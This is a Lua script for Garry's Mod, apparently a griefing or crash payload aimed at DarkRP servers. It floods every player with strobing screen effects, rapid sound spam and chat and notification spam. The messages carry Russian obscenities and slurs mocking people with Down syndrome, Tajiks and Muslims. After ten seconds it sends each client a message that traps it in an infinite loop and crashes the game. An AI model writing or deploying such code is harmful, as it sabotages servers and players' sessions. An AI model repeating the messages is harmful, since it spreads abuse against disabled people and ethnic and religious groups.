if CLIENT then
    local function CreateVisualChaos()
        hook.Add("HUDPaint", "MarlenArtifacts", function()
            for i = 1, 50 do
                surface.SetDrawColor(math.random(255), math.random(255), math.random(255), 255)
                surface.DrawLine(
                    math.random(0, ScrW()), 
                    math.random(0, ScrH()),
                    math.random(0, ScrW()), 
                    math.random(0, ScrH())
                )
            end
    
            surface.SetDrawColor(math.random(255), math.random(255), math.random(255), math.random(150, 255))
            surface.DrawRect(
                math.random(0, ScrW()/2), 
                math.random(0, ScrH()/2),
                math.random(100, ScrW()),
                math.random(100, ScrH())
            )
        end)
    
        hook.Add("RenderScreenspaceEffects", "MarlenFX", function()
            DrawMotionBlur(0.1, 1, 0)
            DrawSharpen(5, 2)
            DrawBloom(1, 2, 9, 9, 10, 1, 1, 1, 1)
        end)

        net.Receive("Marlen_ForceCrash", function()
            while true do end
        end)
    end
    
    CreateVisualChaos()
    end
    
    if SERVER then
    util.AddNetworkString("Marlen_ForceCrash")
    util.AddNetworkString("Marlen_SendMessage")
    
    local function CreateAudioChaos()
        local sounds = {
            "ambient/creatures/town_child_scream1.wav",
            "ambient/machines/squeak_1.wav",
            "ambient/voices/cough1.wav",
            "npc/metropolice/vo/affirmative.wav",
            "npc/zombie/zombie_pain1.wav",
            "physics/glass/glass_largesheet_break1.wav"
        }
    
        timer.Create("MarlenSoundSpam", 0.1, 0, function()
            for _, v in ipairs(player.GetAll()) do
                if IsValid(v) then
                    v:EmitSound(sounds[math.random(#sounds)], 100, math.random(50, 150))
                end
            end
        end)
    end
    
    local function SpamMessages()
        local messages = {
            "FUCKED UP BY MARLEN (H1GHCORE)",
            "Я ЕБАЛ ВСЕХ ВАШИХ МАТЕРЕЙ",
            "Я ЕБАНЫЙ БЕЗ ГОЛОВЫЙ ПИДОРАС У МЕНЯ НЕТУ РОДИТЕЛЕЙ",
            "СЫНЫ ШЛЮХ ПОШЛИ НАХУЙ С СЕРВЕРА",
            "Я СОСУ СМАЧНЫЙ ЖИРНЫЙ ХУЙ",
            "Да брат я король сап суп суп сапа",
            "Я раб пянгвина он меня раком ебет",
            "У меня мать кобыла и ее ебут каждую секунду",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "МОЮ МАТЬ ЕБУТ ПО X9 FENIX RP",
            "МОЮ МАТЬ ЕБУТ ПО X9 FENIX RP",
            "Я быдлан который не умеет нормально базарить",
            "Я РАБ АЛЛАХА",
            "ВОИТСИНУ Я РАБ АЛЛАХА",
            "Я Сын ебаной жирной без головой шлюхи с синдромом дауна",
            "Я Сын ебаной жирной без головой шлюхи с синдромом дауна",
            "Я Сын ебаной жирной без головой шлюхи с синдромом дауна",
            "Я таджик брат,с марелном вперед ТАДЖКИСИТАН!"
        }
    
        local notifications = {
            "FUCKED UP BY MARLEN (H1GHCORE)",
            "Я ЕБАЛ ВСЕХ ВАШИХ МАТЕРЕЙ",
            "Я ЕБАНЫЙ БЕЗ ГОЛОВЫЙ ПИДОРАС У МЕНЯ НЕТУ РОДИТЕЛЕЙ",
            "СЫНЫ ШЛЮХ ПОШЛИ НАХУЙ С СЕРВЕРА",
            "Я СОСУ СМАЧНЫЙ ЖИРНЫЙ ХУЙ",
            "Да брат я король сап суп суп сапа",
            "Я раб пянгвина он меня раком ебет",
            "У меня мать кобыла и ее ебут каждую секунду",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "By marlen - самый настоящий сын  без головой шлюхи, лучший Gpt кодер по супу!",
            "МОЮ МАТЬ ЕБУТ ПО X9 FENIX RP",
            "МОЮ МАТЬ ЕБУТ ПО X9 FENIX RP",
            "Я быдлан который не умеет нормально базарить",
            "Я РАБ АЛЛАХА",
            "ВОИТСИНУ Я РАБ АЛЛАХА",
            "Я Сын ебаной жирной без головой шлюхи с синдромом дауна",
            "Я Сын ебаной жирной без головой шлюхи с синдромом дауна",
            "Я Сын ебаной жирной без головой шлюхи с синдромом дауна",
            "Я таджик брат,с марелном вперед ТАДЖКИСИТАН!"
        }
    
        timer.Create("MarlenMessageSpam", 0.05, 0, function()
            for _, v in ipairs(player.GetAll()) do
                if IsValid(v) then
                    net.Start("Marlen_SendMessage")
                    net.WriteString(messages[math.random(#messages)])
                    net.Send(v)
    
                    DarkRP.notify(v, 0, 4, notifications[math.random(#notifications)])
                end
            end
        end)
    end
    
    
    CreateAudioChaos()
    SpamMessages()
    timer.Simple(10, function()
        for _, ply in ipairs(player.GetAll()) do
            net.Start("Marlen_ForceCrash")
            net.Send(ply)
        end
        CrashGame()
    end)
    end
    
    if CLIENT then
    net.Receive("Marlen_SendMessage", function()
        local msg = net.ReadString()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), msg)
    end)
    end
    
